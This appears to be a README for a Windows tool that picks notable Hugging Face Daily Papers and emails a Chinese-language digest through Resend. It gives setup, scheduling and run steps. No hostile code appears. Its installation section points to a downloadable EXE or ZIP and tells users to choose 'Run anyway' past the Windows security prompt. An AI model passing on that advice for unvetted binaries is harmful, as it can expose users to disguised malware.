# 📰 auto-hf-papers - Daily paper picks sent to you

[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/fratert691/auto-hf-papers/releases)

## 📌 What this app does

auto-hf-papers checks Hugging Face Daily Papers each day, picks the papers that look worth reading, and sends a digest by email at 9:00 AM Beijing time.

It helps you:

- find new papers fast
- skip weak papers
- read a short Chinese summary
- see why each paper was chosen
- open the paper, GitHub repo, or project page with one click

## 💻 What you need

This app runs on Windows with a few basic tools:

- Windows 10 or Windows 11
- Python 3.9 or later
- Node.js 18 or later
- an internet connection
- a Resend account for sending email

If you plan to run it on your own PC, keep the app open or set it to run on a schedule.

## 📥 Download and install

Go to the release page here and download the latest build:

https://github.com/fratert691/auto-hf-papers/releases

After you download it:

1. open the file you downloaded
2. follow the install steps shown in the package
3. place the app in a folder you can find again, like `C:\auto-hf-papers`
4. keep the folder name simple and without spaces if you can

If the release page gives you a ZIP file:

1. right-click the ZIP file
2. choose Extract All
3. open the extracted folder
4. look for the run file or setup steps included with the release

## 🪟 Run on Windows

If the release includes an EXE file:

1. double-click the EXE file
2. wait for the app to finish loading
3. follow any prompts on screen

If the release includes a ZIP package with the app files:

1. open the folder
2. start the app with the provided run file
3. leave the window open while it works

If Windows shows a security prompt:

1. choose More info
2. choose Run anyway if you trust the file source

## ⚙️ First-time setup

You need to set a few values before the app can send email.

### 1) Email sending account

The app uses Resend to send the digest email.

You need:

- a Resend API key
- a verified sender address
- a destination email address

### 2) Basic app settings

Set these values in the app config or environment file:

- email sender name
- sender email address
- email receiver address
- Resend API key
- time zone set to Asia/Shanghai

### 3) Schedule

The app is meant to run every day at 9:00 AM Beijing time.

If you use Windows Task Scheduler:

1. open Task Scheduler
2. create a new task
3. set it to run once each day
4. choose 9:00 AM
5. point it to the app run command

## ▶️ Use the app

You can also run it by hand to test the setup.

### Generate today’s digest

Open a terminal or command prompt in the app folder and run:

```bash
python -m app.run
```

This will:

- fetch today’s Hugging Face Daily Papers page
- read the paper data on the page
- check which papers pass the filter
- build a Markdown digest in the output folder
- send the email through Resend

## 🔎 How it decides what to include

A paper is included if it meets at least one of these rules:

- Hugging Face upvotes are over 20
- GitHub stars are over 100

For each paper, the digest includes:

- title
- why it was picked
- Hugging Face upvotes
- GitHub stars
- Chinese summary
- links to Hugging Face, GitHub, and the project page

## 🧾 Output files

The app saves the digest as a Markdown file in:

- `outputs/YYYY-MM-DD.md`

For example, a digest for 2026-04-17 goes here:

- `outputs/2026-04-17.md`

You can open that file with:

- Notepad
- VS Code
- any text editor

## 🧰 Local setup for manual use

If you want to run the project from source, use this flow on Windows:

1. open Command Prompt or PowerShell
2. go to the project folder
3. create a Python virtual environment
4. install the project
5. run the app command

Example:

```bash
cd C:\auto-hf-papers
python -m venv .venv
.venv\Scripts\activate
python -m pip install -e .
python -m app.run
```

If `python` is not found, use the Python launcher:

```bash
py -m venv .venv
.venv\Scripts\activate
py -m pip install -e .
py -m app.run
```

## 🗂️ How it works

The app follows this path:

1. open `https://huggingface.co/papers/date/YYYY-MM-DD`
2. read the `DailyPapers` JSON on the page
3. collect fields like `upvotes`, `summary`, `ai_summary`, `githubRepo`, and `projectPage`
4. check GitHub stars for papers with a GitHub repo
5. keep papers that pass the rule
6. create a Markdown digest
7. send the email with Resend

It does not download PDF files in the first version. It also does not read the full arXiv paper text.

## 🧪 Check that everything works

After setup, test it once by hand:

1. run the app command
2. look for a new file in `outputs`
3. open the file and check the paper list
4. confirm the email arrives in your inbox

If the email does not arrive, check:

- your Resend API key
- your sender address
- your receiver address
- your internet connection

## 📁 Project structure

The main parts are:

- `app` for Python code
- `outputs` for the daily Markdown files
- `cron` or scheduler settings for daily runs
- Node.js code for email sending

The app uses Python for the data work and Node.js for sending mail.

## 🛠️ Common setup steps on Windows

### Python is missing

Install Python 3.9 or later, then try again.

### Node.js is missing

Install Node.js 18 or later, then check the version with:

```bash
node -v
```

### The app does not start

Check that you are in the right folder and that the virtual environment is active.

### No email arrives

Check the Resend settings and make sure the sender address is verified.

## 📅 Daily use

Once the app is set up:

- it runs every morning at 9:00 AM Beijing time
- it checks that day’s papers
- it filters by upvotes or GitHub stars
- it sends a short digest by email

You can also run it by hand any time you want a fresh digest

## 🔗 Useful links

- Download page: https://github.com/fratert691/auto-hf-papers/releases
- Hugging Face Daily Papers: https://huggingface.co/papers
- Resend: https://resend.com